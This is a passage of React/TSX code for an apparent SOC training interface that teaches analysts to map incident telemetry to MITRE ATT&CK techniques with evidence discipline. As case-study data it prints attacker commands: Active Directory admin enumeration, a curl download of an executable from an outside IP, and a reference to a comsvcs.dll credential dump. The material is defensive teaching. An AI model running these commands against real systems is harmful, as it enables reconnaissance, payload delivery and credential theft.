                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'dsc-account-discovery' ? (
                          <UserCheck className="w-6 h-6 text-cyan-400" />
                        ) : node.id === 'dsc-network-discovery' ? (
                          <Network className="w-6 h-6 text-purple-400" />
                        ) : node.id === 'dsc-remote-host-discovery' ? (
                          <Monitor className="w-6 h-6 text-emerald-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-blue-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 9. STYLE: m13-discovery-credential-bridge (Discovery Credential Bridge)
  // ---------------------------------------------------------------------------
  if (style === 'm13-discovery-credential-bridge') {
    const nodes = discoveryCredentialBridgeNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Link2 className="w-5 h-5 text-cyan-400" />
                <span>The Discovery-to-Credential Bridge: Correlating Incident Chains</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Chronological correlation: Discovery identifies high-value accounts; Credential Access harvests their privileges.
              </p>
            </div>
            <Badge className="bg-cyan-500/20 text-cyan-300 border-cyan-500/30 text-xs font-mono">
              CORRELATION BRIDGE
            </Badge>
          </div>

          {/* Timeline Stage Slider */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">PHASE:</span>
            {[
              { id: 1, label: '1. Reconnaissance (T1087)', node: 'brg-discovery-recon' },
              { id: 2, label: '2. Target Selection (Admin)', node: 'brg-high-value-target' },
              { id: 3, label: '3. Credential Access (T1003)', node: 'brg-credential-execution' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
                  sound.playClick();
                  setChainStage(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  chainStage === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Interactive Bridge Correlation Visualizer */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">TIMELINE CORRELATION: WS-04 INTRUSION</span>
              <Badge className="bg-emerald-500/20 text-emerald-300 text-[11px]">EVIDENTIARY LINK VERIFIED</Badge>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div className={`p-3.5 rounded-xl border ${chainStage >= 1 ? 'bg-cyan-950/50 border-cyan-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <span className="text-cyan-400 font-bold">14:02:10 UTC • DISCOVERY</span>
                <p className="text-white font-bold text-xs mt-1">net group "Domain Admins" /domain</p>
                <p className="text-slate-300 text-[11px] mt-1">Adversary queries Active Directory to identify privileged domain administrators.</p>
                <div className="text-[11px] text-cyan-300 mt-2 font-mono">MITRE: TA0007 / T1087.002</div>
              </div>

              <div className={`p-3.5 rounded-xl border ${chainStage >= 2 ? 'bg-purple-950/50 border-purple-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <span className="text-purple-400 font-bold">14:02:45 UTC • TARGETING</span>
                <p className="text-white font-bold text-xs mt-1">Identified: SVC-SQL-ADMIN</p>
                <p className="text-slate-300 text-[11px] mt-1">Adversary filters output for service account running with elevated SPN rights.</p>
                <div className="text-[11px] text-purple-300 mt-2 font-mono">STATUS: TARGET PINPOINTED</div>
              </div>

              <div className={`p-3.5 rounded-xl border ${chainStage >= 3 ? 'bg-emerald-950/50 border-emerald-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <span className="text-emerald-400 font-bold">14:03:30 UTC • CRED ACCESS</span>
                <p className="text-white font-bold text-xs mt-1">Kerberoasting / comsvcs.dll Dump</p>
                <p className="text-slate-300 text-[11px] mt-1">Direct credential access execution targeting the exact account identified in Phase 1.</p>
                <div className="text-[11px] text-emerald-300 mt-2 font-mono">MITRE: TA0006 / T1003.001</div>
              </div>
            </div>

            <div className="p-2.5 rounded-lg bg-sky-950/40 border border-sky-500/30 text-xs text-slate-300">
              <span className="text-cyan-400 font-bold">ANANYA'S BRIDGE DOCTRINE:</span> Credential Access rarely happens in a vacuum. Correlating the preceding Discovery alert proves deliberate adversary intent.
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'brg-discovery-recon' ? (
                          <Search className="w-6 h-6 text-cyan-400" />
                        ) : node.id === 'brg-high-value-target' ? (
                          <Target className="w-6 h-6 text-purple-400" />
                        ) : node.id === 'brg-credential-execution' ? (
                          <Key className="w-6 h-6 text-emerald-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-blue-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 10. STYLE: m13-technique-specificity-depth (Technique Specificity Depth)
  // ---------------------------------------------------------------------------
  if (style === 'm13-technique-specificity-depth') {
    const nodes = techniqueSpecificityDepthNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Sliders className="w-5 h-5 text-cyan-400" />
                <span>Technique Specificity Hierarchy: Parent vs Sub-Technique Precision</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Calibrate mapping depth: Choose sub-techniques only when specific telemetry corroborates the exact mechanism.
              </p>
            </div>
            <Badge className="bg-cyan-500/20 text-cyan-300 border-cyan-500/30 text-xs font-mono">
              SPECIFICITY DEPTH
            </Badge>
          </div>

          {/* Depth Level Selector */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">DEPTH:</span>
            {[
              { id: 'subtechnique', label: '1. Granular Sub-Technique (T1059.001)', node: 'spc-precise-subtechnique' },
              { id: 'parent', label: '2. Broad Parent Technique (T1059)', node: 'spc-vague-parent-technique' },
              { id: 'overclaim', label: '3. Argument Evidence (CLI Proof)', node: 'spc-argument-evidence' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
                  sound.playClick();
                  setDepthLevel(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  depthLevel === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Hierarchy Breakdown Display */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">HIERARCHICAL CALIBRATION MATRIX</span>
              <Badge className="bg-emerald-500/20 text-emerald-300 text-[11px]">CALIBRATION ACCURACY</Badge>
            </div>

            <div className="p-3.5 rounded-xl bg-slate-900/50 border border-slate-800 space-y-2">
              <div className="text-slate-400 text-xs">PARENT TECHNIQUE:</div>
              <div className="text-white font-bold text-sm">T1059: Command and Scripting Interpreter</div>
              <p className="text-slate-300 text-xs">Use only when telemetry confirms a script was executed, but the engine is unidentified.</p>
              
              <div className="mt-3 pt-3 border-t border-slate-800 space-y-2">
                <div className="text-cyan-400 text-xs font-bold">GRANULAR SUB-TECHNIQUES (MAP ONLY WITH TELEMETRIC PROOF):</div>
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
                  <div className="p-2.5 rounded bg-black/60 border border-cyan-500/40">
                    <span className="text-cyan-300 font-bold">T1059.001</span>
                    <p className="text-white text-xs mt-0.5">PowerShell</p>
                    <p className="text-slate-400 text-[11px] mt-0.5">Requires powershell.exe or System.Management.Automation.dll</p>
                  </div>
                  <div className="p-2.5 rounded bg-black/60 border border-slate-800">
                    <span className="text-blue-300 font-bold">T1059.003</span>
                    <p className="text-white text-xs mt-0.5">Windows Command Shell</p>
                    <p className="text-slate-400 text-[11px] mt-0.5">Requires cmd.exe process execution</p>
                  </div>
                  <div className="p-2.5 rounded bg-black/60 border border-slate-800">
                    <span className="text-purple-300 font-bold">T1059.005</span>
                    <p className="text-white text-xs mt-0.5">Visual Basic</p>
                    <p className="text-slate-400 text-[11px] mt-0.5">Requires wscript.exe or cscript.exe execution</p>
                  </div>
                </div>
              </div>
            </div>

            <div className="p-2.5 rounded-lg bg-sky-950/40 border border-sky-500/30 text-xs text-slate-300">
              <span className="text-cyan-400 font-bold">ANANYA'S SPECIFICITY RULE:</span> Do not map to a sub-technique unless you have explicit telemetry proving that specific interpreter. When in doubt, the parent technique preserves forensic honesty.
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'spc-vague-parent-technique' ? (
                          <Layers className="w-6 h-6 text-slate-400" />
                        ) : node.id === 'spc-precise-subtechnique' ? (
                          <Target className="w-6 h-6 text-cyan-400" />
                        ) : node.id === 'spc-argument-evidence' ? (
                          <Terminal className="w-6 h-6 text-blue-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-purple-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 11. STYLE: m13-plausible-vs-speculative (Plausible vs Speculative)
  // ---------------------------------------------------------------------------
  if (style === 'm13-plausible-vs-speculative') {
    const nodes = plausibleVsSpeculativeNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <AlertOctagon className="w-5 h-5 text-cyan-400" />
                <span>Plausible vs Speculative Matching: Avoiding the Overclaiming Trap</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Anchor every technique mapping in direct observables; resist the urge to map unobserved downstream stages.
              </p>
            </div>
            <Badge className="bg-cyan-500/20 text-cyan-300 border-cyan-500/30 text-xs font-mono">
              EVIDENCE RESTRAINT
            </Badge>
          </div>

          {/* Claim Mode Selector */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">APPROACH:</span>
            {[
              { id: 'grounded', label: '1. Grounded & Observed (Verified)', node: 'plu-grounded-observable' },
              { id: 'speculative', label: '2. Wild Speculation Trap (Overclaim)', node: 'plu-wild-speculation-trap' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
                  sound.playClick();
                  setClaimMode(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  claimMode === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Interactive Split-Screen Comparison */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">CASE STUDY: curl.exe http://198.51.100.24/update.dat -o C:\\Temp\\up.exe</span>
              <Badge className="bg-cyan-500/20 text-cyan-300 text-[11px]">DISCIPLINED TRIAGE EVALUATION</Badge>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div className={`p-3.5 rounded-xl border ${claimMode === 'grounded' ? 'bg-emerald-950/40 border-emerald-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <div className="flex items-center justify-between">
                  <span className="text-emerald-400 font-bold text-xs">GROUNDED MAPPING (EVIDENCED)</span>
                  <Badge className="bg-emerald-950 text-emerald-300 text-[11px]">HIGH CONFIDENCE</Badge>
                </div>
                <div className="p-2.5 rounded bg-black/60 border border-emerald-900/40 mt-2 text-white text-xs space-y-1">
                  <div>Tactic: TA0011 (Command and Control)</div>
                  <div>Technique: T1105 (Ingress Tool Transfer)</div>
                  <div className="text-emerald-300">Observable: Inbound binary download logged via curl.exe</div>
                </div>
                <p className="text-slate-300 text-xs mt-2">
                  Legitimate and defensible. Directly supported by process execution and destination file creation.
                </p>
              </div>

              <div className={`p-3.5 rounded-xl border ${claimMode === 'speculative' ? 'bg-rose-950/40 border-rose-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <div className="flex items-center justify-between">
                  <span className="text-rose-400 font-bold text-xs">SPECULATIVE OVERCLAIM (UNPROVEN)</span>
                  <Badge className="bg-rose-950 text-rose-300 text-[11px]">ANALYST TRAP</Badge>
                </div>
                <div className="p-2.5 rounded bg-black/60 border border-rose-900/40 mt-2 text-rose-200 text-xs space-y-1">
                  <div>Tagging: T1486 (Data Encrypted for Impact) ❌</div>
                  <div>Tagging: T1048 (Exfiltration Over Alternative Protocol) ❌</div>
                  <div>Tagging: T1021 (Remote Services Lateral Movement) ❌</div>
                </div>
                <p className="text-slate-400 text-xs mt-2">
                  Fatal error: None of these downstream techniques have been observed. Speculating causes alert fatigue and panic.
                </p>
              </div>
            </div>

            <div className="p-2.5 rounded-lg bg-sky-950/40 border border-sky-500/30 text-xs text-slate-300">
              <span className="text-cyan-400 font-bold">ANANYA'S RESTRAINT STANDARD:</span> Report what is proven. Formulate unobserved possibilities as working hypotheses, not asserted technique facts.
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'plu-grounded-observable' ? (
                          <CheckCircle2 className="w-6 h-6 text-emerald-400" />
                        ) : node.id === 'plu-plausible-mapping' ? (
                          <Target className="w-6 h-6 text-cyan-400" />
                        ) : node.id === 'plu-wild-speculation-trap' ? (
                          <AlertTriangle className="w-6 h-6 text-rose-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-purple-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 12. STYLE: m13-evidence-threshold-matrix (Evidence Threshold Matrix)
  // ---------------------------------------------------------------------------
  if (style === 'm13-evidence-threshold-matrix') {
    const nodes = evidenceThresholdMatrixNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <CheckCheck className="w-5 h-5 text-cyan-400" />
                <span>Evidence Threshold Matrix: Validation Gates for Technique Tagging</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Minimum telemetry gates required before an ATT&amp;CK technique can be certified in an official SOC ticket.
              </p>
            </div>
            <Badge className="bg-cyan-500/20 text-cyan-300 border-cyan-500/30 text-xs font-mono">
              VALIDATION GATES
            </Badge>
          </div>

          {/* Gate Selector */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">GATE:</span>
            {[
              { id: 'cli', label: '1. Command-Line Telemetry Gate', node: 'thr-command-line-gate' },
              { id: 'path', label: '2. Process Path & Hash Gate', node: 'thr-process-path-gate' },
              { id: 'lineage', label: '3. Parent Lineage Gate', node: 'thr-parent-lineage-gate' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
                  sound.playClick();
                  setGateSelected(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  gateSelected === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Interactive Gate Checklist Display */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">TECHNIQUE VALIDATION AUDIT GATEWAY</span>
              <Badge className="bg-emerald-500/20 text-emerald-300 text-[11px]">3/3 GATES PASSED</Badge>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div className={`p-3.5 rounded-xl border ${gateSelected === 'path' ? 'bg-cyan-950/50 border-cyan-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <div className="flex items-center justify-between">
                  <span className="text-cyan-300 font-bold">GATE 1: PATH &amp; HASH</span>
                  <Check className="w-4 h-4 text-emerald-400" />
                </div>
                <p className="text-slate-300 text-xs mt-1">Full path verification: C:\\Windows\\System32\\whoami.exe</p>
                <div className="text-[11px] text-cyan-300 mt-2">SHA256 verified against known clean baseline.</div>
              </div>

              <div className={`p-3.5 rounded-xl border ${gateSelected === 'cli' ? 'bg-purple-950/50 border-purple-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <div className="flex items-center justify-between">
                  <span className="text-purple-300 font-bold">GATE 2: CLI ARGS</span>
                  <Check className="w-4 h-4 text-emerald-400" />
                </div>
                <p className="text-slate-300 text-xs mt-1">Exact arguments captured: whoami /all</p>
                <div className="text-[11px] text-purple-300 mt-2">Confirms T1033 System Owner/User Discovery.</div>
              </div>

              <div className={`p-3.5 rounded-xl border ${gateSelected === 'lineage' ? 'bg-emerald-950/50 border-emerald-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <div className="flex items-center justify-between">
                  <span className="text-emerald-300 font-bold">GATE 3: LINEAGE</span>
                  <Check className="w-4 h-4 text-emerald-400" />
                </div>
                <p className="text-slate-300 text-xs mt-1">Parent: powershell.exe (PID 3140) spawned by Word.</p>
                <div className="text-[11px] text-emerald-300 mt-2">Corroborates malicious macro execution context.</div>
              </div>
            </div>

            <div className="p-2.5 rounded-lg bg-sky-950/40 border border-sky-500/30 text-xs text-slate-300 flex items-center justify-between">
              <span>
                <span className="text-cyan-400 font-bold">CERTIFICATION SEAL:</span> All 3 evidentiary gates satisfied. Technique T1033 is legally certified for ticket insertion.
              </span>
              <span className="text-emerald-400 font-bold">READY FOR TRIAGE DOCKET ✓</span>
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'thr-process-path-gate' ? (
                          <Folder className="w-6 h-6 text-cyan-400" />
                        ) : node.id === 'thr-command-line-gate' ? (
                          <Terminal className="w-6 h-6 text-purple-400" />
                        ) : node.id === 'thr-parent-lineage-gate' ? (
                          <Workflow className="w-6 h-6 text-blue-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-emerald-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 13. STYLE: m13-evidentiary-anchors-dossier (Evidentiary Anchors Dossier)
  // ---------------------------------------------------------------------------
  if (style === 'm13-evidentiary-anchors-dossier') {
    const nodes = evidentiaryAnchorsDossierNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <FileCode className="w-5 h-5 text-cyan-400" />
                <span>Evidentiary Anchors Dossier: Binding Observables to ATT&amp;CK Tags</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                An ATT&amp;CK tag without an observable anchor is hearsay. Every tag must bind to verified forensic evidence.
              </p>
            </div>
            <Badge className="bg-cyan-500/20 text-cyan-300 border-cyan-500/30 text-xs font-mono">
              EVIDENCE ANCHORS
            </Badge>
          </div>

          {/* Anchor Tab Selector */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">ANCHOR:</span>
            {[
              { id: 'telemetry', label: '1. Telemetry Anchor (GUID & Hash)', node: 'anc-telemetry-anchor' },
              { id: 'technique', label: '2. Technique Tag Binding', node: 'anc-technique-tag' },
              { id: 'justification', label: '3. Observable Proof & Justification', node: 'anc-observable-proof' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
                  sound.playClick();
                  setAnchorTab(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  anchorTab === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Interactive Evidence Binder Display */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">CASE #2026-ATT-912: EVIDENTIARY ANCHOR DOCKET</span>
              <Badge className="bg-emerald-500/20 text-emerald-300 text-[11px]">IRREFUTABLE PROVENANCE</Badge>
            </div>

            <div className="p-3.5 rounded-xl bg-slate-900/60 border border-slate-800 space-y-2">
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                <div className="p-3 rounded-lg bg-black/60 border border-slate-800 space-y-1">
                  <span className="text-cyan-400 font-bold">ATT&amp;CK TAG:</span>
                  <div className="text-white font-bold text-sm">T1059.001</div>
                  <div className="text-slate-300 text-xs">PowerShell Script Execution</div>
                </div>

                <div className="p-3 rounded-lg bg-black/60 border border-slate-800 space-y-1">
                  <span className="text-purple-400 font-bold">TELEMETRY ANCHOR:</span>
                  <div className="text-white font-bold text-xs">Sysmon Event ID 1 &amp; 4104</div>
                  <div className="text-slate-300 text-xs">GUID: {'{7B91A4-320F-4D2A}'}</div>
                </div>

